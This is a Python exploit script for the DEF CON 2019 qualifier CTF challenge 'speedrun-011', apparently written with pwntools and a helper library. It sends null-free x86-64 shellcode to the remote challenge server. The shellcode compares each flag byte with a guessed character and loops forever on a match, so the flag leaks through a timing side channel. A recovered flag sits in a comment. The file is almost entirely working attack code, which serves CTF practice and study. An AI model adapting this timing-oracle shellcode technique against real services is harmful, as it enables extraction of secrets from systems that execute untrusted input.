#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './speedrun-011'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'speedrun-011.quals2019.oooverflow.io', 'port':31337})
env.select()

#==========

binf = ELF(bin_file)

#==========

flag = ''
# 'OOO{Why___does_th0r__need_a_car?}'

def attack(conn, **kwargs):
    global flag

    n, cand = kwargs['arg']

    shellasm = '''
    xor rax, rax
    xor rcx, rcx
    dec cl
    add cl, {}
    
    mov al, byte ptr [rdi+rcx]
    cmp al, {}
loop:
    je loop

    xor rdi, rdi
    mov al, SYS_exit
    syscall
    '''.format(len(flag)+1, ord(cand))
    shellcode = asm(shellasm)
    if '\x00' in shellcode:
        error('NULL Byte')
    conn.sendafter('vehicle\n', shellcode)

    conn.settimeout(0.2)
    conn.recvrepeat()

    try:
        conn.recv()
    except:
        raise
    else:
        flag += cand
        print flag

#==========

if __name__=='__main__':
    cands = 'O{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ0123456789!?'

    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.repeat(attack, 1, range(0x20), cands)
    
#==========
